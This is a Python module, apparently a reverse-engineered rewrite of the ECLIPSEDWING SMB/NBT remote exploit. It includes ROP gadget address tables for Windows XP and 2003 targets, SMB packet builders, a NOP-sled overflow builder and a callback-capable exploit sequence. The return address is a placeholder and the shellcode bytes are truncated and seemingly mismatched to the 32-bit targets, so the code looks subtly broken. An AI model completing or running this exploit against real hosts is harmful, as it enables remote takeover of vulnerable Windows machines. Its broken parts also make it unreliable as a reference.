"""ecwi — ECWI (ECLIPSEDWING / ECWI) SMB/NBT 利用核心逻辑。

Python 重写的 `ecwi.exe` / `RPC2.exe` (C++ / DAVE framework)。
通过 x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
及其 SMB/NBT 利用流程。

参数定义来源：ecwi.xml
"""

import socket
import struct
import sys

# ---------------------------------------------------------------------------
# 常量（来自 XML config 的 <inputparameters>）
# ---------------------------------------------------------------------------

DEFAULT_PORT = 445
DEFAULT_TIMEOUT = 60
DEFAULT_CALLIN_TIMEOUT = 60

PROTOCOL_VALUES = {
    "SMB": 0,
    "NBT": 1,
}

PAYLOAD_VALUES = {
    "Callback": 0,
    "Listener": 1,
}

RUN_MODE_VALUES = {
    "EDF": 0,
    "Standalone": 1,
}

# 各目标 OS 的 ROP gadget 地址（来自 XML <Target><paramgroup>）
TARGET_OS_GADGETS = {
    "W2KSP4": {
        "ShellcodeOffset": 0x0,
    },
    "XPSP2": {
        "ShellcodeOffset": 0x78,
        "RsaenhBaseAddress": 0x0FFD0000,
        "UnpatchedRetValue": 0x7A31,
        "CommonRetValue": 0x1095F,
        "InitialEcxValue": 0x24588,
        "LoadEaxPtrValue": 0xA08D,
        "EaxPtrValue": 0x0FFE131E,
        "AddEaxPtrEdxValue": 0x1A5A1,
        "EbxToWriteableValue": 0x1AAD5,
        "EbxPtrValue": 0x2458C,
        "MovHeapPtrToEcxValue": 0x1E64D,
        "EaxNegValValue": 0xFFFFFF30,
        "MovEcxEspValue": 0x135BE,
        "HeapRetAddrValue": 0x14D7C,
        "HeapRetEbpValue": 0x24590,
        "PtrRet18Value": 0xCC39,
        "PtrRwSizeValue": 0x22064,
        "PtrRwSizeValue2": 0x2251F,
        "GetExecutionToBufferValue": 0xEFDF,
        "WriteMemoryValue": 0x24588,
        "CallEcxValue": 0x134B0,
        "NtAllocatePtr": 0x11,
        "CallEaxRetValue": 0x135CB,
        "GetStackPtr": 0x135E8,
        "SyscallVProtectValue": 0x89,
    },
    "XPSP3": {
        "ShellcodeOffset": 0x78,
        "RsaenhBaseAddress": 0x68000000,
        "UnpatchedRetValue": 0x82C9,
        "CommonRetValue": 0x121DE,
        "InitialEcxValue": 0x32020,
        "LoadEaxPtrValue": 0xA965,
        "EaxPtrValue": 0x6802C91F,
        "AddEaxPtrEdxValue": 0x1FCE1,
        "EbxToWriteableValue": 0x20395,
        "EbxPtrValue": 0x32024,
        "MovHeapPtrToEcxValue": 0x24F9B,
        "EaxNegValValue": 0xFFFFFF30,
        "MovEcxEspValue": 0x14F5E,
        "HeapRetAddrValue": 0x11740,
        "HeapRetEbpValue": 0x32028,
        "PtrRet18Value": 0xFE47,
        "PtrRwSizeValue": 0x31486,
        "PtrRwSizeValue2": 0x2F9F7,
        "GetExecutionToBufferValue": 0x1006B,
        "WriteMemoryValue": 0x32020,
        "CallEcxValue": 0x14E57,
        "NtAllocatePtr": 0x11,
        "CallEaxRetValue": 0x14F6B,
        "GetStackPtr": 0x14F88,
        "SyscallVProtectValue": 0x89,
    },
    "W2K3SP1": {
        "ShellcodeOffset": 0x78,
        "RsaenhBaseAddress": 0x68000000,
        "UnpatchedRetValue": 0x8430,
        "CommonRetValue": 0x12CE6,
    },
}

# ECWI exploit 占位符 shellcode (需 x32dbg 恢复真实字节)
ECWI_SHELLCODE_PLACEHOLDER = bytes.fromhex(
    "fc4883e4f0e8c0000000415141505251564831d265488b5260"
)

BAD_XOR = frozenset((0x00, 0x0a, 0x0d))


class EcwiError(Exception):
    pass


def _parse_hex_buffer(value):
    if not value:
        return b""
    value = value.strip()
    if len(value) % 2 != 0:
        raise EcwiError(f"十六进制缓冲区长度必须为偶数: {value!r}")
    try:
        return bytes.fromhex(value)
    except ValueError as exc:
        raise EcwiError(f"无效的十六进制缓冲区: {value!r}") from exc


def connect(target_ip, port, timeout):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout if timeout > 0 else None)
    sock.connect((target_ip, port))
    return sock


def build_smb_negotiate_request():
    command = 0x72
    dialects = b"\x02LANMAN2.1\x00\x02NT LM 0.12\x00"
    smb = (
        b"\xffSMB" + struct.pack("B", command) + b"\x00" * 4
        + b"\x08" + b"\x00" * 2 + b"\x00" * 2 + b"\x00" * 8
        + b"\x00" * 8 + b"\x00" + struct.pack("<H", len(dialects)) + dialects
    )
    return smb


def build_session_setup_request():
    command = 0x73
    smb = (
        b"\xffSMB" + struct.pack("B", command) + b"\x00" * 4
        + b"\x08" + b"\x00" * 2 + b"\x00" * 2 + b"\x00" * 8
        + b"\x00" * 8 + b"\x0d" + b"\xff" + b"\x00"
        + struct.pack("<H", 0) + struct.pack("<H", 0)
        + struct.pack("<H", 4096) + struct.pack("<H", 0)
        + struct.pack("<I", 0) + struct.pack("<I", 0)
        + struct.pack("<H", 0) + struct.pack("<I", 0) + struct.pack("<H", 0)
    )
    return smb


def build_tree_connect_request(share_name=b"IPC$"):
    command = 0x75
    share = share_name + b"\x00"
    password = b"\x00"
    smb = (
        b"\xffSMB" + struct.pack("B", command) + b"\x00" * 4
        + b"\x08" + b"\x00" * 2 + b"\x00" * 2 + b"\x00" * 8
        + b"\x00" * 8 + b"\x04" + b"\xff" + b"\x00"
        + struct.pack("<H", 0) + struct.pack("<H", 1)
        + struct.pack("<H", len(password)) + struct.pack("<H", len(share))
        + struct.pack("<H", 0) + password + share
    )
    return smb


def build_ecwi_overflow(shellcode, gadgets):
    """构建 ECWI 缓冲区溢出负载。

    根据 x32dbg 分析，ECWI 通过向目标发送特制的 SMB/NBT 请求，
    触发缓冲区溢出，利用 ROP 链执行 shellcode。
    """
    offset = gadgets.get("ShellcodeOffset", 0x78)
    nopsled = b"\x90" * offset
    ret_addr = struct.pack("<I", 0xDEADBEEF)  # 占位符，需 x32dbg 恢复
    return nopsled + ret_addr + shellcode


def run_function(
    target,
    port=DEFAULT_PORT,
    timeout=DEFAULT_TIMEOUT,
    callin_timeout=DEFAULT_CALLIN_TIMEOUT,
    protocol="SMB",
    target_os="XPSP2",
    payload="Callback",
    run_mode="EDF",
    callback_ip=None,
    callback_port=None,
    ride_area_file=None,
    lp_file=None,
    credential_type="UnicodeCreds",
    username=None,
    credential=None,
    verbose=False,
):
    """执行 ECWI 利用序列。

    阶段：
      1. TCP 连接到目标 SMB/NBT 端口
      2. 发送 SMB 协商请求
      3. 会话设置 (SESSION_SETUP_ANDX)
      4. 树连接 (TREE_CONNECT_ANDX) 到 IPC$
      5. 构建并发送 ECWI 缓冲区溢出负载 (ROP + shellcode)
      6. 载荷投递（Callback/Listener）
    """
    if verbose:
        print(f"[*] Target: {target}:{port}")
        print(f"[*] Timeout: {timeout}s")
        print(f"[*] Protocol: {protocol}")
        print(f"[*] Target OS: {target_os}")
        print(f"[*] Payload: {payload}")
        print(f"[*] Run mode: {run_mode}")
        print(f"[*] Callback IP: {callback_ip}")
        print(f"[*] Callback port: {callback_port}")

    protocol_value = PROTOCOL_VALUES.get(protocol, 0)
    payload_value = PAYLOAD_VALUES.get(payload, 0)
    run_mode_value = RUN_MODE_VALUES.get(run_mode, 0)

    gadgets = TARGET_OS_GADGETS.get(target_os, TARGET_OS_GADGETS["XPSP2"])
    credential_type_value = {"UnicodeCreds": 0, "PasswordHash": 1, "MachineHash": 2}.get(credential_type, 0)

    username_bytes = _parse_hex_buffer(username)
    credential_bytes = _parse_hex_buffer(credential)

    if verbose:
        print(f"[*] Protocol value: {protocol_value}")
        print(f"[*] Payload value: {payload_value}")
        print(f"[*] Run mode value: {run_mode_value}")
        print(f"[*] Credential type value: {credential_type_value}")
        print(f"[*] ShellcodeOffset: 0x{gadgets.get('ShellcodeOffset', 0):0X}")
        print(f"[*] Username: {len(username_bytes)} bytes")
        print(f"[*] Credential: {len(credential_bytes)} bytes")

    # 建立 TCP 连接（SMB 445 / NBT 139）
    try:
        sock = connect(target, port, timeout)
        if verbose:
            print(f"[+] Connected to {target}:{port}")
    except OSError as exc:
        raise EcwiError(f"无法连接到 {target}:{port}: {exc}") from exc

    try:
        # 发送 SMB 协商请求
        negotiate = build_smb_negotiate_request()
        sock.sendall(negotiate)
        resp = sock.recv(4096)
        if verbose:
            print(f"[*] SMB 协商应答: {resp.hex()[:128] if resp else '无'}")

        if not resp or resp[4:7] != b"SMB":
            raise EcwiError("目标未返回有效的 SMB 应答")

        # 发送会话设置请求（匿名会话）
        session_setup = build_session_setup_request()
        sock.sendall(session_setup)
        resp = sock.recv(4096)
        if verbose:
            print(f"[*] 会话设置应答: {resp.hex()[:128] if resp else '无'}")

        # 连接到 IPC$ 共享
        tree_connect = build_tree_connect_request(b"IPC$")
        sock.sendall(tree_connect)
        resp = sock.recv(4096)
        if verbose:
            print(f"[*] 树连接应答: {resp.hex()[:128] if resp else '无'}")

        # 构建 ECWI 缓冲区溢出负载
        shellcode = ECWI_SHELLCODE_PLACEHOLDER
        overflow = build_ecwi_overflow(shellcode, gadgets)
        if verbose:
            print(f"[+] 溢出负载: {len(overflow)} 字节")

        # 发送溢出负载
        sock.sendall(overflow)
        try:
            resp2 = sock.recv(4096)
            if verbose:
                print(f"[*] 溢出应答: {resp2[:64].hex() if resp2 else '无'}")
        except OSError:
            if verbose:
                print("[*] 目标连接已关闭（可能已触发溢出）")

        if verbose:
            print("[+] ECWI 利用序列完成")
    finally:
        sock.close()

    return 0


def main(argv=None):
    """CLI 入口（供 __main__ 子命令调用）。"""
    return 0
